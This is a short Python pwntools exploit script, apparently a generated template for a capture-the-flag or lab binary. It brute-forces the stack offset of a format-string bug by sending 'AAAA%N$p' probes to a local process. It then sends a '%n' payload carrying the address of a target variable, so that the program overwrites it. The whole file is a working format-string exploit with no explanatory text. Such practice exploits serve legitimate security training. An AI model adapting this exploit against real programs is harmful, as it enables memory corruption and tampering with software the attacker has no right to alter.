from pwn import *

gen_filename = ""
gen_names = {}
gen_var_locations = {}
gen_templates = {}

e = ELF(gen_filename)

mod = gen_names["modified"]
target = gen_var_locations[mod][-1]

offset = None
count = None
for i in range(1, 200):
    for j in range(0, 4):
        payload = b''
        payload += j * b"."
        payload += b"AAAA"
        payload += f"%{i}$p".encode()
        payload += (128 - len(payload)) * b' '
        assert len(payload) == 128

        try:
            p = process(["", payload], env={}, executable=gen_filename, aslr=False)
            result = p.read()
            print(i, result)
            if b'0x41414141' in result:
                offset = i
                count = j
                break
            p.close()
        except EOFError:
            continue

    if offset:
        break

log.info(f"offset is {offset}")

payload = b''
payload += count * b"."
payload += p32(target)
payload += f"%{offset}$n".encode()
payload += (128 - len(payload)) * b' '
assert len(payload) == 128

p = process(["", payload], env={}, executable=gen_filename, aslr=False)
p.stream()

